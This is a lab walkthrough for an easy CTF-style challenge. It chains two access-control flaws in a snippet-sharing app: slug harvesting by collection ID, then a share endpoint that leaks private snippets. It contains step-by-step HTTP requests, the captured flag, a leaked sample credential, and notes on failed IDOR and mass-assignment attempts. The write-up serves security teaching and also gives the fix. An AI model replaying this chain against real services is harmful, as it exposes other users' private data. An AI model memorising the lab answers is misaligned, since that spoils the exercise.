# copypasta-009 - BugForge Lab Walkthrough

**URL:** https://lab-1782350554031-mi5ij3.labs-app.bugforge.io/  
**Difficulty:** Easy  
**Vulnerability:** Collection Share Slug Exposes Private Snippets (IDOR)  
**Flag:** `bug{ntObVCA7coqIetEYRK4KIs8dXs3vX16m}`

---

## Summary

CopyPasta lets users group snippets into collections and share them via a slug-based URL. The `GET /api/collections/share/:slug` endpoint returns every snippet in the collection, including private ones (`is_public = 0`), without filtering by visibility. Collection slugs are exposed to any authenticated user via `GET /api/collections/:id` with no ownership check. The two-step chain: harvest a collection slug by ID, then use the share endpoint to read all private snippets in it.

## Tech Stack

- React SPA (CRA), JWT in localStorage
- Express.js (Node.js), SQLite
- JWT auth (`Authorization: Bearer`)
- Multi-user snippets, collections, tokens

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Fields: `username`, `email`, `password`, `full_name` |
| `/api/login` | POST | No | Returns JWT |
| `/api/collections/:id` | GET | JWT | Returns collection + slug, no ownership check |
| `/api/collections/share/:slug` | GET | JWT | **Vulnerable** - returns all snippets including private |
| `/api/profile/:username` | GET | JWT | User profile + all snippets (public and private) |
| `/api/snippets/share/:share_code` | GET | JWT | Access snippet by share code |

## Vulnerability

`GET /api/collections/share/:slug` powers the public share-link feature. It fetches all snippets linked to the collection via a JOIN but omits the `is_public` filter:

```sql
-- What the server does (vulnerable)
SELECT s.* FROM snippets s
JOIN collection_snippets cs ON cs.snippet_id = s.id
WHERE cs.collection_id = ?

-- What it should do
SELECT s.* FROM snippets s
JOIN collection_snippets cs ON cs.snippet_id = s.id
WHERE cs.collection_id = ?
  AND s.is_public = 1
```

The slug needed to hit this endpoint is obtainable from `GET /api/collections/:id`, which returns full collection metadata including the slug to any authenticated user regardless of ownership.

## Attack Chain

### Step 1 - Register an account

```
POST /api/register HTTP/1.1
Host: lab-1782350554031-mi5ij3.labs-app.bugforge.io
Content-Type: application/json

{"username":"attacker","password":"attacker123","email":"attacker@test.com","full_name":"Attacker"}
```

Response:
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {"id": 6, "username": "attacker", "role": "user"}
}
```

### Step 2 - Harvest the collection slug by ID

```
GET /api/collections/2 HTTP/1.1
Host: lab-1782350554031-mi5ij3.labs-app.bugforge.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Response:
```json
{
  "collection": {
    "id": 2,
    "user_id": 1,
    "name": "Admin Toolbox",
    "is_public": 1,
    "slug": "3a7d4551-6698-4078-8a77-9cfc727a7211",
    "username": "admin"
  },
  "snippets": [...],
  "is_owner": false
}
```

The response includes the `slug` even though `is_owner: false`. No private snippets are shown here; those come in the next step.

### Step 3 - Use the slug to read all private snippets in the collection

```
GET /api/collections/share/3a7d4551-6698-4078-8a77-9cfc727a7211 HTTP/1.1
Host: lab-1782350554031-mi5ij3.labs-app.bugforge.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Response:
```json
{
  "collection": {
    "id": 2,
    "name": "Admin Toolbox",
    "slug": "3a7d4551-6698-4078-8a77-9cfc727a7211",
    "username": "admin"
  },
  "snippets": [
    {
      "id": 7,
      "title": "SQL Query Example",
      "is_public": 1,
      ...
    },
    {
      "id": 8,
      "title": "prod.env (internal)",
      "code": "# CopyPasta production — keep this private\nDATABASE_URL=postgres://cp_app:Sg7xPq2vTm@db.internal:5432/copypasta\nADMIN_NOTES=rotate the load-balancer cert before the July audit\nINTERNAL_DASHBOARD=https://ops.internal/copypasta",
      "is_public": 0,
      ...
    }
  ],
  "flag": "bug{ntObVCA7coqIetEYRK4KIs8dXs3vX16m}"
}
```

Snippet 8 has `"is_public": 0` but is returned in full, private content and flag included.

## Discovery Notes

- `quick-triage.py` identified the CopyPasta app and flagged it as a known series (copypasta-008 pattern ruled out - no token collision)
- JS bundle revealed `/api/collections/share/:slug` as a distinct share endpoint, separate from `/api/collections/:id`
- Collections use a `slug` UUID field; snippets use a `share_code` UUID field - two different slug mechanisms
- `GET /api/collections/:id` returned `is_owner: false` for other users' collections but still included the slug, confirming slug harvesting was possible
- The share endpoint returned private snippet 8 alongside public snippet 7, confirming the missing `is_public` filter

## Dead Ends

| Attempt | Why it failed | Lesson |
|---------|--------------|--------|
| Token name collision (copypasta-008 technique) | No pre-seeded tokens; all `POST /api/tokens` calls created fresh tokens | Different variant, different bug |
| `GET /api/profile/:username` IDOR | Does leak private snippets and share_codes - valid secondary bug, but no flag delivered there | Real IDOR but not the flag path |
| `GET /api/snippets/share/:share_code` with admin's private snippet | Returns the snippet - valid bug, still no flag | Flag lives in the collection share endpoint |
| `DELETE /api/tokens/:id` IDOR | Returns "Token not found" for other users' IDs | Properly ownership-scoped |
| Mass assignment `role:admin` on profile update | Field ignored | Server strips unknown fields on write |

## Root Cause

The `GET /api/collections/share/:slug` handler fetches all snippets joined to the collection without applying a `WHERE snippets.is_public = 1` guard. Private snippets are intended to be visible only to their owner, but when added to a collection the share endpoint leaks them in full. Compounded by the fact that collection slugs are readable by any authenticated user via `GET /api/collections/:id`.

## CWE / OWASP

- **CWE-284**: Improper Access Control (missing visibility filter on shared resource)
- **CWE-200**: Exposure of Sensitive Information to an Unauthorized Actor
- **OWASP A01:2021** - Broken Access Control (IDOR via collection slug)
- **Impact:** Any authenticated user can read all private snippets belonging to any user, provided those snippets have been added to any collection
